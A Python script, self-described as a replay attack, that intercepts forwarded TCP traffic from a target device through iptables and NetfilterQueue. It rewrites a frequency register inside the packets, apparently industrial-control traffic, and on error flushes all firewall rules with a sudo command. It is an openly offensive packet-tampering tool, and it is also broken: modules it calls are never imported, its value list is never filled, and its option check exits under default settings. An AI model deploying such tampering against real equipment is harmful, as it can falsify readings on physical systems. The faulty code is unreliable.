from scapy.all import *
from netfilterqueue import NetfilterQueue
import random
import numpy as np

change_values = []
debugging = False

def get_values():
    
    return change_values

def modify_packet(scapy_packet):
    global change_values
    global debugging
    try:
        packet = IP(scapy_packet.get_payload())
        if packet.haslayer(Raw):
            payload = packet[Raw].load
            data = payload[9:]

            first_register = int.from_bytes(data[0:2], byteorder="big")
            if first_register == 101 and len(payload) > 100:
                hz_register = int.from_bytes(data[32:34], byteorder="big")
                
                #debug
                if debugging: print("Orginal Frequency:", hz_register)
                
                if len(change_values) == 0: get_values()
                change_value=change_values.pop(0)
                
                change_value = int(change_value*10000)
                
                #debug        
                if debugging: print("Change Value:", change_value)
                
                new_sec_register = hz_register + change_value
                if new_sec_register < 0:
                    new_sec_register = -new_sec_register
                if new_sec_register > 65535:
                    new_sec_register = 65535-change_value
                new_sec_register_bytes = new_sec_register.to_bytes(2, byteorder="big")
                modified_payload = payload[:41] + new_sec_register_bytes + payload[43:]

                packet[Raw].load = modified_payload

                del packet[IP].len
                del packet[IP].chksum
                if packet.haslayer(TCP):
                    del packet[TCP].chksum
                
                #debug  
                if debugging: print("Modified Frequecy:", new_sec_register)
 

                scapy_packet.set_payload(bytes(packet))
                #debug
                if debugging: print("Modified and sent packet \n")


        scapy_packet.accept()
    except Exception as e:
        print(f"CRITICAL ERROR: {e}")
        traceback.print_exc()
        scapy_packet.drop() 
        os.system("sudo pkill -f NFQUEUE && sudo iptables -F")

def setup_iptables(ip,port):
    os.system(f'iptables -I FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')

def cleanup_iptables(ip, port):
    os.system(f'iptables -D FORWARD -p tcp --sport {port} -s {ip} -j NFQUEUE --queue-num 1')



if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(description='Replay attack')
    parser.add_argument('target', help='IP of target')
    parser.add_argument('-p', '--port', default='30502',
                       help='Port of target')
    
    parser.add_argument('-s', '--store', default=False, action='store_true',
                       help='Store values in csv file')
    parser.add_argument('-o', '--output', default='captured_freq.csv',
                       help='Output csv file (default: captured_freq.csv)')
    
    parser.add_argument('-a', '--attack', default=False, action='store_true',
                       help='Attack mode')
    parser.add_argument('-r', '--read' , default='captured_freq.csv',
                       help='Read from csv file (default: captured_freq.csv)')
    
    parser.add_argument('-d', '--debug', default=False, action='store_true',
                       help='Debug mode')
    args = parser.parse_args()
    
    ip = args.target
    port=args.port
    debugging = args.debug
    store=args.store
    output=args.output
    attack=args.attack
    read=args.read

    if (attack or output) and (store or read):
        print("[*] Output file and store/read mode can not be used together")
        sys.exit(1)
        
    try:
        setup_iptables(ip,port)
        print(f"[*] IPTables rules set on {ip}:{port}")
        nfqueue = NetfilterQueue()
        print("[*] Creating NFQUEUE")
        nfqueue.bind(1, modify_packet)
        print("[*] Starting NFQUEUE")
        print("[*] Waiting for packets")
        nfqueue.run() 
    except Exception as e:
        print("[*] Error:", e)
    except KeyboardInterrupt:
        print("[*] Stopping NFQUEUE")
    finally:
        if nfqueue:
            nfqueue.unbind()
            print("[*] Stopped NFQUEUE")
        cleanup_iptables(ip,port)
        print("[*] IPTables rules removed")
        sys.exit(0)
